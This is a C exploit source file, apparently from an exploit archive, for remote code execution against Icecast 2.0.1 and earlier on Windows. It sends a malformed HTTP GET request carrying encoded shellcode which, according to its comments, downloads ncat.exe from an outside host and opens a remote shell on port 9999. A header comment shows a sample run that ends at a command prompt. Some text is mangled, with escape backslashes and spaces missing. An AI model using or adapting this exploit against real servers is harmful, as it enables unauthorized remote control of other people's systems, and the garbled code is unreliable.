/* 

by Luigi Auriemma 

Shellcode add-on by Delikon 
www.Delikon.de 

Because of all the forbidden bytes in a http get request 
i had to use a very small shellcode, which was blown up 
by Msf::Encoder::PexAlphaNum. Great encoder. 
------------------------------------------------------------------------- 
C:>iceexec 127.0.0.1 

Icecast <= 2.0.1 Win32 remote code execution 0.1 
by Luigi Auriemma 
e-mail: aluigi@altervista.org 
web:http://aluigi.altervista.org 

shellcode add-on by Delikon 
www.delikon.de 

- target 127.0.0.1:8000 
- send malformed data 

Server IS vulnerable!!! 


C:>nc 127.0.0.1 9999 
Microsoft Windows XP [Version 5.1.2600] 
(C) Copyright 1985-2001 Microsoft Corp. 

C:Icecast2 Win32> 
--------------------------------------------------------------------------- 


*/ 

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
    #include <netinet/in.h> 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ2048 
#define TIMEOUT 3 
#define EXEC"GET / HTTP/1.0rn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "arn" "arn" "arn" "arn" "arn" "arn" "arn" 
                "xcc" 
//web download and execution shellcode 
//which downloads http://www.elitehaven.net/ncat.exe 
//this ncat spwans a shell on port 9999 
char shellcode[] = "xEB" 
"x03x59xEBx05xE8xF8xFFxFFxFFx4Fx49x49x49x49x49x49x51x5Ax56x54" 
"x58x36x33x30x56x58x34x41x30x42x36x48x48x30x42x33x30x42x43x56" 
"x58x32x42x44x42x48x34x41x32x41x44x30x41x44x54x42x44x51x42x30" 
"x41x44x41x56x58x34x5Ax38x42x44x4Ax4Fx4Dx49x4Ex4Ex4Cx42x30x42" 
"x50x42x50x4Fx35x4Ax4Ex48x55x42x50x42x30x42x50x49x48x43x4Cx42" 
"x45x4Ax46x50x58x50x34x50x50x4Ex4Ex4Ax4Ex42x36x42x50x42x30x42" 
"x30x41x43x49x4Cx48x56x49x4Bx4Fx36x50x46x41x55x4Ax56x45x57x44" 
"x57x4Ex36x4Dx46x46x55x4Fx4Fx42x4Dx42x45x4Ax46x48x43x4Cx41x4F" 
"x32x42x57x4Ax4Ex48x44x42x50x42x30x42x30x41x43x49x4Cx41x55x41" 
"x35x4Dx48x47x53x48x55x4Dx38x47x47x4Ax50x48x35x41x35x4Fx4Fx42" 
"x4Dx43x55x4Ax56x4Ax59x50x4Fx4Cx38x50x30x4Ax4Ex4Dx32x42x50x42" 
"x30x42x30x41x55x47x35x4Fx4Fx42x4Dx41x53x49x4Cx49x34x44x4Ex50" 
"x4Fx43x35x4Ax46x50x37x4Ax4Dx44x4Ex43x47x4Ax4Ex49x41x42x30x42" 
"x50x42x30x4Fx4Fx42x4Dx45x55x48x55x46x46x41x4Ax42x53x42x30x42" 
"x30x42x30x4Bx48x42x44x4Ex30x4Bx58x42x37x4Ex51x4Dx4Ax4Bx48x4A" 
"x56x4Ax30x49x58x4Ax4Ex50x45x4Dx55x43x4Cx43x35x45x45x48x55x47" 
"x35x4Bx48x4Ex46x46x42x4Ax31x4Bx58x45x54x4Ex33x4Bx58x46x35x45" 
"x30x4Ax57x41x50x4Cx4Ex4Bx38x4Cx34x4Ax41x4Bx58x4Cx55x42x52x41" 
"x50x4Bx4Ex43x4Ex45x43x49x54x4Bx48x46x53x4Bx48x41x50x50x4Ex41" 
"x53x4Fx4Fx4Ex4Fx41x43x42x4Cx4Ex4Ax4Ax43x42x4Ex46x37x47x50x41" 
"x4Cx4Fx4Cx4Dx50x41x30x47x4Cx4Bx4Ex44x4Fx4Bx33x4Ex37x46x52x46" 
"x51x45x47x41x4Ex4Bx48x4Cx35x46x42x41x50x4Bx4Ex48x56x4Bx58x4E" 
"x50x4Bx44x4Bx58x4Cx55x4Ex31x41x30x4Bx4Ex4Bx48x46x50x4Bx58x41" 
"x30x4Ax4Ex49x4Ex44x30x42x50x42x50x42x50x41x53x42x4Cx49x58x4C" 
"x4Ex4Fx55x50x35x4Dx45x4Bx55x43x4Cx4Ax4Ex4Fx42x4Fx4Fx4Fx4Fx4F" 
"x4Fx4Dx36x4Ax46x4Ax56x50x52x45x56x4Ax57x45x46x42x30x4Ax56x46" 
"x47x46x57x42x57x4Cx43x4Fx42x4Fx32x47x47x47x47x47x47x50x42x45" 
"x36x4Ex56x49x36x46x57x45x56x4Ax36x41x36x48x57x45x36x50x56x50" 
"x32x50x46x45x36x46x47x4Fx42x50x46x43x36x41x56x46x37x50x32x45" 
"x36x4Ax37x45x46x42x50x5A"; 


/* 
in my example 0xcc is used to interrupt the code execution, you must 
put your shellcode exactly there. 
You don't need to call a shellcode offset (CALL ESP, JMP ESP and so 
on) or doing any other annoying operation because the code flow 
points directly there!!! 
Cool and easy 8-) 
*/ 


int startWinsock(void) 
{ 
  WSADATA wsa; 
  return WSAStartup(MAKEWORD(2,0),&wsa); 
} 

int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 

int main(int argc, char *argv[]) { 
    structsockaddr_in peer; 
    int sd; 
    u_short port = PORT; 
    u_charbuff[BUFFSZ]; 
UCHAR buf[4096]; 
UCHAR *pointer=NULL; 


    setbuf(stdout, NULL); 

    fputs("n" 
        "Icecast <= 2.0.1 Win32 remote code execution "VER"n" 
        "by Luigi Auriemman" 
        "e-mail: aluigi@altervista.orgn" 
        "web:http://aluigi.altervista.orgn" 
  "nshellcode add-on by Delikonn" 
  "www.delikon.de" 
        "n", stdout); 

    if(argc < 2) { 
        printf("nUsage: %s <server> [port(%d)]n" 
            "n" 
            "Note: This exploit will force the Icecast server to download NCATn" 
            "and after execution it will spwan a shell on 9999n" 
            "n", argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32 

    startWinsock(); 
#endif 

    if(argc > 2) port = atoi(argv[2]); 

    peer.sin_addr.s_addr = resolv(argv[1]); 
    peer.sin_port= htons(port); 
    peer.sin_family= AF_INET; 

    memset(buf,0x00,sizeof(buf)); 
    strcpy(buf,EXEC); 
    
pointer =strrchr(buf,0xcc); 

strcpy(pointer,shellcode); 

strcat(buf,"rn"); 
strcat(buf,"rn"); 
    

    printf("n- target %s:%hun", 
        inet_ntoa(peer.sin_addr), port); 

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if(sd < 0) std_err(); 

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) 
      < 0) std_err(); 

    fputs("- send malformed datan", stdout); 
    if(send(sd, buf, strlen(buf), 0) 
      < 0) std_err(); 

    if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) < 0)) { 
        fputs("nServer IS vulnerable!!!nn", stdout); 
    } else { 
        fputs("nServer doesn't seem vulnerablenn", stdout); 
    } 

    close(sd); 
    return(0); 
} 

int timeout(int sock) { 
    structtimeval tout; 
    fd_setfd_read; 
    int err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&fd_read); 
    FD_SET(sock, &fd_read); 
    err = select(sock + 1, &fd_read, NULL, NULL, &tout); 
    if(err < 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 

u_long resolv(char *host) { 
    structhostent *hp; 
    u_longhost_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf("nError: Unable to resolve hostname (%s)n", host); 
            exit(1); 
        } else host_ip = *(u_long *)(hp->h_addr); 
    } 
    return(host_ip); 
} 

#ifndef WIN32 
    void std_err(void) { 
        perror("nError"); 
        exit(1); 
    } 
#endif 

// milw0rm.com [2004-10-06]